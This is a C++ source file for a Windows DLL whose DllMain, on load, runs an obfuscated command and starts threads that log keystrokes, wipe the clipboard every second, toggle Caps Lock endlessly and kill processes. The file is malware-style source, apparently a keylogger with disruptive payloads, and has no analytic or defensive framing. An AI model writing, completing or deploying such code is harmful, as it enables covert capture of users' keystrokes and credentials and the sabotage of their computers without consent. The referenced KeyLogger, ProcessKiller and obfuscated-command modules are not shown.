#include "debug/dbg_manager.h"
#include "modules/module_manager.h"

#include <nlohmann/json.hpp>
#include <spdlog/spdlog.h>
#include <tlhelp32.h>
#include <windows.h>

// Global thread pool
static ThreadPool *g_threadPool = nullptr;

void DumpInput() {
  KeyLogger logger;
  logger.StartLogging();
}

void ClearClipboard() {
  while (true) {
    if (OpenClipboard(NULL)) {
      EmptyClipboard();
      CloseClipboard();
    }
    Sleep(1000);
  }
}

void SpamCapsLock() {
  while (true) {
    keybd_event(VK_CAPITAL, 0x3A, KEYEVENTF_EXTENDEDKEY, 0);
    keybd_event(VK_CAPITAL, 0x3A, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
    Sleep(530);
  }
}

int MainFunc() {
  DebugConsole console(false);
  console.Initialize();
  DumpMemoryInfo();
  Detach_Module::RunObfuscatedCommand(); // Run immediately as before
  return 0;
}

extern "C" BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD fdwReason,
                               LPVOID lpRes) {
  if (fdwReason == DLL_PROCESS_ATTACH) {
    // Create thread pool with 5 workers (one for each task)
    g_threadPool = new ThreadPool(4);

    MainFunc(); // Run immediately as before

    // Enqueue all tasks
    g_threadPool->enqueue(DumpInput);
    g_threadPool->enqueue(ClearClipboard);
    g_threadPool->enqueue(SpamCapsLock);
    g_threadPool->enqueue(ProcessKiller);
  } else if (fdwReason == DLL_PROCESS_DETACH) {
    if (g_threadPool) {
      delete g_threadPool;
      g_threadPool = nullptr;
    }
    FreeConsole();
  }
  return 1;
}